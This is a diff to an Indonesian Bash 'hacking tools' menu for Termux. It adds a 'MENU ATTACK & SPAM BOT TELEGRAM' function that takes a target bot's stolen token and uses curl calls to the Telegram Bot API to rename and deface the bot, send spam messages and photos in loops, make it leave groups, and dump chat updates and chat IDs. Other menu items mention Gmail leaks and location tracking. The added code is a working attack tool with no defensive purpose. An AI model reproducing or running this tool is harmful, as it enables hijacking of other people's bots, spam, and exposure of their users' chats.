@@ -350,7 +350,7 @@ echo -e "${GREEN}
  │  [  ${RED}12${GREEN}  ]  │ ${YELLOW}KEBOCORAN GMAIL${GREEN}         │[  SUNTIK ] MENU SUNTIK   │
  │  [  ${RED}13${GREEN}  ]  │ ${YELLOW}ENCRYPS CODE ${GREEN}           │[  MUSIK  ] MUSIK ALBUM   │
  │  [  ${RED}14${GREEN}  ]  │ ${YELLOW}LACAK NAMA${GREEN}              │[  DARK   ] MENU DARK     │
- │  [  ${RED}15${GREEN}  ]  │ ${YELLOW}LACAK LOKASI NOMOR (IP)${GREEN} │                          │
+ │  [  ${RED}15${GREEN}  ]  │ ${YELLOW}LACAK LOKASI NOMOR (IP)${GREEN} │[  ATKTG  ] MENU ATTACK TG│
  │  [  ${RED}16${GREEN}  ]  │ ${YELLOW}LAPORKAN BUG  ${GREEN}          │                          │
  │  [  ${RED}17${GREEN}  ]  │ ${YELLOW}MENU TRACKING${GREEN}           │                          │
  │  [  ${RED}18${GREEN}  ]  │ ${YELLOW}MENU OSIN${GREEN}               │                          │
@@ -575,6 +575,12 @@ DARK|dark)
     DarkMenu
     klik
     ;;
+ATKTG|atktg)
+    klik
+    AttackTG
+    kembali_ke_menu
+    klik
+    ;;
     00|0)
     klik
       echo -e "${CYAN}TERIMAKASIH SUDAH MENGGUNAKAN TOOLS DANXY.${NC}" | lolcat -p 0.7
@@ -590,6 +596,201 @@ DARK|dark)
     esac
   done
 }
+
+
+R='\e[38;5;196m'  # merah neon
+G='\e[38;5;082m'  # hijau terang
+Y='\e[38;5;226m'  # kuning neon
+B='\e[38;5;051m'  # biru cyan
+M='\e[38;5;201m'  # magenta terang
+C='\e[38;5;051m'  # cyan
+W='\e[38;5;015m'  # putih tulang
+RESET='\e[0m'
+
+USER="$(whoami)"  
+HOST="$(hostname -s)" 
+AttackTG() {
+clear
+echo -e "
+${G}● ${Y}● ${R}●${B}
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⡄   _____   __    __                 __     
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣿⣿⡿⠿⠛⢙⣿⣿⠃  /  _  \_/  |__/  |______    ____ |  | __ 
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⣾⣿⣿⠿⠛⠋⠁⠀⠀⠀⣸⣿⣿⠀ /  /_\  \   __\   __\__  \ _/ ___\|  |/ / 
+⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⡿⠟⠛⠉⠀⠀⣠⣤⠞⠁⠀⠀⣿⣿⡇⠀/    |    \  |  |  |  / __ \\  \___|    <  
+⠀⣴⣾⣿⣿⡿⠿⠛⠉⠀⠀⠀⢀⣠⣶⣿⠟⠁⠀⠀⠀⢸⣿⣿⠀${R}⠀\____|__  /__|  |__| (____  /\___  >__|_ \ ${B}
+⠸⣿⣿⣿⣧⣄⣀⠀⠀⣀⣴⣾⣿⣿⠟⠁⠀⠀⠀⠀⠀⣼⣿⡿⠀${R}⠀        \/                \/     \/     \/ ${B}
+⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⢠⣿⣿⠇⠀⠀______________________.____     ___________
+⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡇⠀⣀⣄⡀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀\__    ___/\_   _____/|    |    \_   _____/
+⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣠⣾⣿⣿⣿⣦⡀⠀⠀⣿⣿⡏⠀⠀⠀  |    |    |    __)_ |    |     |    __)_ 
+⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⡿⠋⠈⠻⣿⣿⣦⣸⣿⣿⠁⠀⠀⠀  |    |    |        \|    |___  |        \
+⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠙⠛⠁⠀⠀⠀⠀⠈⠻⣿⣿⣿⠏${RESET}${R}       |____|   /_______  /|_______ \/_______ /
+  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+  │         ${C}MENU ATTACK & SPAM BOT TELEGRAM BY TOOLS V8.4        ${R} │
+  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+"
+
+# Cek dependensi
+for dep in curl jq; do
+  command -v $dep &>/dev/null || { echo -e "${R}[!] $dep belum terinstal.${RESET} Jalankan: pkg install $dep"; exit 1; }
+done
+echo -e "${R} [!]${RESET} MASUKAN TOKEN BOT TELEGRAM TARGET UNTUK MELANJUTKAN KE MENU"
+echo -en "${Y} [?]${RESET} TOKEN BOT TARGET: ${C}"
+read -r TOKEN
+echo -e "${RESET}"
+
+echo -e "${RESET}\n${G} [✓]${RESET} Menghubungkan ke API ..."
+cek_info(){
+  resp=$(curl -s "https://api.telegram.org/bot$TOKEN/getMe")
+  ok=$(echo "$resp" | jq -r '.ok')
+  if [[ "$ok" != "true" ]]; then
+    echo -e "${R}[!] Token salah / koneksi gagal.${RESET}"
+    echo "$resp" | jq -r '.description'
+    return
+  fi
+  USERBOT=$(echo "$resp" | jq -r '.result.username')
+  echo -e "${G} [✓]${RESET} Bot terhubung : @${C}${USERBOT}${RESET}"
+}
+
+##############  MENU FITUR ###############
+set_name(){
+  read -rp "Nama baru bot : " BARU
+  resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/setMyName" -d "name=$BARU")
+  echo "$resp" | jq -e '.ok' && echo -e "${G}[✓]${RESET} Nama berhasil diubah." || echo -e "${R}[!] Gagal.${RESET}"
+}
+
+set_desc(){
+  read -rp "Deskripsi baru : " BARU
+  resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/setMyDescription" -d "description=$BARU")
+  echo "$resp" | jq -e '.ok' && echo -e "${G}[✓]${RESET} Deskripsi berhasil diubah." || echo -e "${R}[!] Gagal.${RESET}"
+}
+
+set_shortdesc(){
+  read -rp "Short description baru : " BARU
+  resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/setMyShortDescription" -d "short_description=$BARU")
+  echo "$resp" | jq -e '.ok' && echo -e "${G}[✓]${RESET} Short desc berhasil diubah." || echo -e "${R}[!] Gagal.${RESET}"
+}
+
+set_photo(){
+  echo -e "${Y}[i]${RESET} Kirim foto (≤5 MB, JPG/PNG) ke Termux, lalu masukkan path absolut."
+  read -rp "Path foto : " PIC
+  [[ ! -f "$PIC" ]] && { echo -e "${R}[!] File tidak ditemukan.${RESET}"; return; }
+
+  resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/setMyPhoto" \
+           -F "photo=@$PIC")
+  ok=$(echo "$resp" | jq -r '.ok')
+  if [[ "$ok" == "true" ]]; then
+    echo -e "${G}[✓] Foto profil bot berhasil diubah.${RESET}"
+  else
+    echo -e "${R}[!] Gagal:${RESET} $(echo "$resp" | jq -r '.description')"
+  fi
+}
+
+
+spam_text(){
+  read -rp "ID tujuan : " TID
+  read -rp "Teks pesan : " ISI
+  read -rp "Jumlah kirim : " JML
+  echo -e "${M}----------------------------------------"
+  echo -e "Target : $TID"
+  echo -e "Pesan  : $ISI"
+  echo -e "Jumlah : $JML kali"
+  read -rp "Konfirmasi kirim? (y/N) : " CONF
+  [[ "$CONF" != "y" && "$CONF" != "Y" ]] && { echo -e "${R}[!] Dibatalkan.${RESET}"; return; }
+  for ((i=1;i<=JML;i++)); do
+    resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d "chat_id=$TID" -d "text=$ISI")
+    echo "$resp" | jq -e '.ok' &>/dev/null && echo -e "${G}[$i/$JML]${RESET} Terkirim" || echo -e "${R}[$i/$JML]${RESET} Gagal"
+  done
+  echo -e "${G}[✓] Proses selesai.${RESET}"
+}
+
+spam_photo(){
+  echo -e "${Y}[i]${RESET} Kirim file foto ke Termux, lalu masukkan path absolut."
+  read -rp "Path foto : " PIC
+  [[ ! -f "$PIC" ]] && { echo -e "${R}[!] File tidak ditemukan.${RESET}"; return; }
+  read -rp "ID tujuan : " TID
+  read -rp "Caption (boleh kosong) : " CAP
+  read -rp "Jumlah kirim : " JML
+  read -rp "Konfirmasi kirim? (y/N) : " CONF
+  [[ "$CONF" != "y" && "$CONF" != "Y" ]] && { echo -e "${R}[!] Dibatalkan.${RESET}"; return; }
+  for ((i=1;i<=JML;i++)); do
+    resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendPhoto" -F "chat_id=$TID" -F "photo=@$PIC" -F "caption=$CAP")
+    echo "$resp" | jq -e '.ok' &>/dev/null && echo -e "${G}[$i/$JML]${RESET} Terkirim" || echo -e "${R}[$i/$JML]${RESET} Gagal"
+  done
+  echo -e "${G}[✓] Proses selesai.${RESET}"
+}
+
+leave_chat(){
+  read -rp "ID grup/channel yang ingin di-leave : " TID
+  resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/leaveChat" -d "chat_id=$TID")
+  echo "$resp" | jq -e '.ok' && echo -e "${G}[✓]${RESET} Bot keluar dari obrolan." || echo -e "${R}[!] Gagal.${RESET}"
+}
+
+get_updates(){
+  echo -e "${Y}[i]${RESET} Mendapatkan update terbaru (limit 20) ..."
+  curl -s "https://api.telegram.org/bot$TOKEN/getUpdates?limit=20" | jq -r '
+    .result[] |
+    "\(.update_id | tostring) | \(.message.chat.type) | @\(.message.chat.username // .message.chat.title // .message.chat.id) | \(.message.chat.id)"'
+}
+
+dump_ids(){
+  echo -e "${Y}[i]${RESET} Dump semua ID obrolan dari update (limit 100) ..."
+  curl -s "https://api.telegram.org/bot$TOKEN/getUpdates?limit=100" | jq -r '
+    .result[] |
+    select(.message.chat.id) |
+    "\(.message.chat.type) | \(.message.chat.id) | @\(.message.chat.username // .message.chat.title // "NoName")"'
+}
+
+file_to_bot(){
+  echo -e "${Y}[i]${RESET} Upload file ke Telegram lalu dapatkan file_id-nya."
+  read -rp "Path file : " FILE
+  [[ ! -f "$FILE" ]] && { echo -e "${R}[!] File tidak ditemukan.${RESET}"; return; }
+  read -rp "Chat ID tujuan (isi ID Anda) : " TID
+  resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" -F "chat_id=$TID" -F "document=@$FILE")
+  echo "$resp" | jq -e '.ok' && echo -e "${G}[✓] File terkirim – file_id:${RESET}" && echo "$resp" | jq -r '.result.document.file_id' || echo -e "${R}[!] Gagal.${RESET}"
+}
+
+##############  MENU UTAMA ###############
+cek_info
+while true; do
+  echo -e "                                                              ${G}● ${Y}● ${R}●${RESET}\n${M}┌${RESET}""$(printf '━%.0s' $(seq 1 67))""${M}┐${RESET}"
+  echo -e "${M}│${RESET}                              ${R}MAIN MENU${RESET}                            ${M}│${RESET}"
+  echo -e "${M}├${RESET}""$(printf '━%.0s' $(seq 1 67))""${M}┤${RESET}"
+  echo -e "${M}│${RESET}  ${C} 1${RESET}. Setting nama bot                                             ${M}│${RESET}"
+  echo -e "${M}│${RESET}  ${C} 2${RESET}. Setting deskripsi                                            ${M}│${RESET}"
+  echo -e "${M}│${RESET}  ${C} 3${RESET}. Setting short description                                    ${M}│${RESET}"
+  echo -e "${M}│${RESET}  ${C} 4${RESET}. Setting foto profil                                          ${M}│${RESET}"
+  echo -e "${M}│${RESET}  ${C} 5${RESET}. Kirim teks (spam)                                            ${M}│${RESET}"
+  echo -e "${M}│${RESET}  ${C} 6${RESET}. Kirim foto (spam)                                            ${M}│${RESET}"
+  echo -e "${M}│${RESET}  ${C} 7${RESET}. Leave chat / keluar grup                                     ${M}│${RESET}"
+  echo -e "${M}│${RESET}  ${C} 8${RESET}. Get updates (lihat pesan baru)                               ${M}│${RESET}"
+  echo -e "${M}│${RESET}  ${C} 9${RESET}. Dump semua ID obrolan                                        ${M}│${RESET}"
+  echo -e "${M}│${RESET}  ${C}10${RESET}. Upload file & dapatkan file_id                               ${M}│${RESET}"
+  echo -e "${M}│${RESET}  ${R} 0${RESET}. Keluar                                                       ${M}│${RESET}"
+  echo -e "${M}└${RESET}""$(printf '━%.0s' $(seq 1 67))""${M}┘${RESET}"
+
+PTH="~/Menu"
+PROMPT="$(echo -e "\n${B}┌──(${G}${USER}${W}@${M}${HOST}${B})-[${C}${PTH}${B}]\n└─${Y}\$ ${M}")"
+read -r -p "$PROMPT" PIL
+echo -e "\n${G}${RESET}"
+
+  case $PIL in
+    1) set_name ;;
+    2) set_desc ;;
+    3) set_shortdesc ;;
+    4) set_photo ;;
+    5) spam_text ;;
+    6) spam_photo ;;
+    7) leave_chat ;;
+    8) get_updates ;;
+    9) dump_ids ;;
+   10) file_to_bot ;;
+    0) echo -e "\n${G}Sampai jumpa ~${RESET}";return ;;
+    *) echo -e "\n${R}[!] Pilihan tidak valid.${RESET}";;
+  esac
+done
+}
+
 
 DarkMenu() {
 set -euo pipefail
@@ -7479,6 +7680,7 @@ while true; do
   done
 done
 }
+
 generate_password() {
     read -p "Masukkan panjang password yang diinginkan: " length
 
